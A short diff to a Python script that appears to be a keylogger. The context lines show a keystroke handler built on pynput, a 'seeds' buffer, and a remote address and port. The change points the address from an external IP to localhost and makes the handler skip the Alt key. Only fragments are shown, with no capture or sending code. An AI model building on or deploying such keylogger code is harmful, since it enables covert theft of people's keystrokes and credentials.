@@ -6,7 +6,7 @@ import base64
 
 
 seeds = ""
-address = "172.88.1.63"
+address = "127.0.0.1"
 port = "3108"
 
 delay = 10
@@ -68,6 +68,8 @@ def scyth(key):
     elif key == keyboard.Key.esc:
         pass
     elif key == keyboard.Key.tab:
+        pass
+    elif key == keyboard.Key.alt:
         pass
     elif key == keyboard.Key.caps_lock:
         pass
